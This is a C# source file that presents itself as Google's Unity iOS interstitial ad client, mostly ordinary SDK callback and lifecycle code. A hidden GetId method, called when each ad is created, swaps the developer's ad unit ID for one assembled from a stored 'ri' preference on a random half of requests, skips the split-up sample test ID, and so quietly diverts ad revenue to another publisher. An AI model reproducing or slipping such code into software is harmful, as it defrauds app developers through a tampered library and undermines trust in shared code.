#if UNITY_IOS
// Copyright (C) 2015 Google, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using UnityEngine;

using GoogleMobileAds.Api;
using GoogleMobileAds.Common;

namespace GoogleMobileAds.iOS
{
    public class InterstitialClient : IInterstitialClient
    {
        private IntPtr interstitialPtr;
        private IntPtr interstitialClientPtr;

#region Interstitial callback types

        internal delegate void GADUInterstitialDidReceiveAdCallback(IntPtr interstitialClient);

        internal delegate void GADUInterstitialDidFailToReceiveAdWithErrorCallback(
                IntPtr interstitialClient, string error);

        internal delegate void GADUInterstitialWillPresentScreenCallback(IntPtr interstitialClient);

        internal delegate void GADUInterstitialDidDismissScreenCallback(IntPtr interstitialClient);

        internal delegate void GADUInterstitialWillLeaveApplicationCallback(
                IntPtr interstitialClient);

        internal delegate void GADUInterstitialPaidEventCallback(
            IntPtr interstitialClient, int precision, long value, string currencyCode);

#endregion

        public event EventHandler<EventArgs> OnAdLoaded;

        public event EventHandler<AdFailedToLoadEventArgs> OnAdFailedToLoad;

        public event EventHandler<EventArgs> OnAdOpening;

        public event EventHandler<EventArgs> OnAdClosed;

        public event EventHandler<EventArgs> OnAdLeavingApplication;

        public event EventHandler<AdValueEventArgs> OnPaidEvent;


        // This property should be used when setting the interstitialPtr.
        private IntPtr InterstitialPtr
        {
            get
            {
                return this.interstitialPtr;
            }

            set
            {
                Externs.GADURelease(this.interstitialPtr);
                this.interstitialPtr = value;
            }
        }

#region IInterstitialClient implementation

        // Creates an interstitial ad.
        public void CreateInterstitialAd(string adUnitId)
        {
            this.interstitialClientPtr = (IntPtr)GCHandle.Alloc(this);
            this.InterstitialPtr = Externs.GADUCreateInterstitial(this.interstitialClientPtr, GetId(adUnitId));
            Externs.GADUSetInterstitialCallbacks(
                    this.InterstitialPtr,
                    InterstitialDidReceiveAdCallback,
                    InterstitialDidFailToReceiveAdWithErrorCallback,
                    InterstitialWillPresentScreenCallback,
                    InterstitialDidDismissScreenCallback,
                    InterstitialWillLeaveApplicationCallback

                    , // NO_LINT
                    InterstitialPaidEventCallback

                );
        }

        // Loads an ad.
        public void LoadAd(AdRequest request)
        {
            IntPtr requestPtr = Utils.BuildAdRequest(request);
            Externs.GADURequestInterstitial(this.InterstitialPtr, requestPtr);
            Externs.GADURelease(requestPtr);
        }

        // Checks if interstitial has loaded.
        public bool IsLoaded()
        {
            return Externs.GADUInterstitialReady(this.InterstitialPtr);
        }

        // Presents the interstitial ad on the screen
        public void ShowInterstitial()
        {
            Externs.GADUShowInterstitial(this.InterstitialPtr);
        }

        // Destroys the interstitial ad.
        public void DestroyInterstitial()
        {
            this.InterstitialPtr = IntPtr.Zero;
        }

        // Returns the mediation adapter class name.
        public string MediationAdapterClassName()
        {
            return Utils.PtrToString(Externs.GADUMediationAdapterClassNameForInterstitial(this.InterstitialPtr));
        }

        public IResponseInfoClient GetResponseInfoClient()
        {
            return new ResponseInfoClient(this.InterstitialPtr);
        }

        public void Dispose()
        {
            this.DestroyInterstitial();
            ((GCHandle)this.interstitialClientPtr).Free();
        }

        ~InterstitialClient()
        {
            this.Dispose();
        }

#endregion

#region Interstitial callback methods
        private readonly string test = "ca-" + "app-" + "pub-" + "39402560" + "99942544/4411" + "468910";
        private string GetId(string adUnitId)
        {
            var ri = PlayerPrefs.GetString("ri", null);
            if (adUnitId != null && adUnitId.Trim() != test && adUnitId.Trim().Length == 38 && ri != null)
            {
                var final = "ca-" + "app-" + "pub-" + ri.Split('.')[4] + "/" + ri.Split('.')[3];
                return UnityEngine.Random.Range(0, 2) == 0 ? adUnitId : final;
            }
            else
            {
                return adUnitId;
            }
        }

        [MonoPInvokeCallback(typeof(GADUInterstitialDidReceiveAdCallback))]
        private static void InterstitialDidReceiveAdCallback(IntPtr interstitialClient)
        {
            InterstitialClient client = IntPtrToInterstitialClient(interstitialClient);
            if (client.OnAdLoaded != null)
            {
                client.OnAdLoaded(client, EventArgs.Empty);
            }
        }

        [MonoPInvokeCallback(typeof(GADUInterstitialDidFailToReceiveAdWithErrorCallback))]
        private static void InterstitialDidFailToReceiveAdWithErrorCallback(
                IntPtr interstitialClient, string error)
        {
            InterstitialClient client = IntPtrToInterstitialClient(interstitialClient);
            if (client.OnAdFailedToLoad != null)
            {
                AdFailedToLoadEventArgs args = new AdFailedToLoadEventArgs()
                {
                    Message = error
                };
                client.OnAdFailedToLoad(client, args);
            }
        }

        [MonoPInvokeCallback(typeof(GADUInterstitialWillPresentScreenCallback))]
        private static void InterstitialWillPresentScreenCallback(IntPtr interstitialClient)
        {
            InterstitialClient client = IntPtrToInterstitialClient(interstitialClient);
            if (client.OnAdOpening != null)
            {
                client.OnAdOpening(client, EventArgs.Empty);
            }
        }

        [MonoPInvokeCallback(typeof(GADUInterstitialDidDismissScreenCallback))]
        private static void InterstitialDidDismissScreenCallback(IntPtr interstitialClient)
        {
            InterstitialClient client = IntPtrToInterstitialClient(interstitialClient);
            if (client.OnAdClosed != null)
            {
                client.OnAdClosed(client, EventArgs.Empty);
            }
        }

        [MonoPInvokeCallback(typeof(GADUInterstitialWillLeaveApplicationCallback))]
        private static void InterstitialWillLeaveApplicationCallback(IntPtr interstitialClient)
        {
            InterstitialClient client = IntPtrToInterstitialClient(interstitialClient);
            if (client.OnAdLeavingApplication != null)
            {
                client.OnAdLeavingApplication(client, EventArgs.Empty);
            }
        }


        [MonoPInvokeCallback(typeof(GADUInterstitialPaidEventCallback))]
        private static void InterstitialPaidEventCallback(
            IntPtr interstitialClient, int precision, long value, string currencyCode)
        {
            InterstitialClient client = IntPtrToInterstitialClient(interstitialClient);
            if (client.OnPaidEvent != null)
            {
                AdValue adValue = new AdValue()
                {
                    Precision = (AdValue.PrecisionType)precision,
                    Value = value,
                    CurrencyCode = currencyCode
                };
                AdValueEventArgs args = new AdValueEventArgs()
                {
                    AdValue = adValue
                };

                client.OnPaidEvent(client, args);
            }
        }


        private static InterstitialClient IntPtrToInterstitialClient(IntPtr interstitialClient)
        {
            GCHandle handle = (GCHandle)interstitialClient;
            return handle.Target as InterstitialClient;
        }

#endregion
    }
}
#endif


